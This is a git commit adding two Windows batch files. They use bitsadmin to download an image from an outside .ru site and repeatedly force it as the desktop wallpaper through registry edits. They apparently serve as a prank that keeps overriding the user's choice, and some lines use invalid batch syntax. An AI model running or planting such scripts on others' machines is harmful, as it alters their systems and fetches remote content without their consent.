2ef8f17c08e9218693bfbe0d6eeb5ed57019ad96
NikitHern <herndlhofer@icloud.com>
2017-08-03 20:43:49 +0300

    Add files via upload

---
+++ petuh.bat
@@ -0,0 +1,15 @@
+bitsadmin.exe /transfer "JobName" https://03grb.ru/sites/default/files/images/articles/fvr_377.jpg D:\petuh.bmp
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  D:\petuh.bmp /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  D:\petuh.bmp /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  D:\petuh.bmp /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  D:\petuh.bmp /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  D:\petuh.bmp /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+sleep(2000)
---
+++ start.bat
@@ -0,0 +1,7 @@
+call petuh.bat
+sleep(50000)
+call petuh.bat
+sleep(50000)
+call petuh.bat
+sleep(50000)
+call petuh.bat
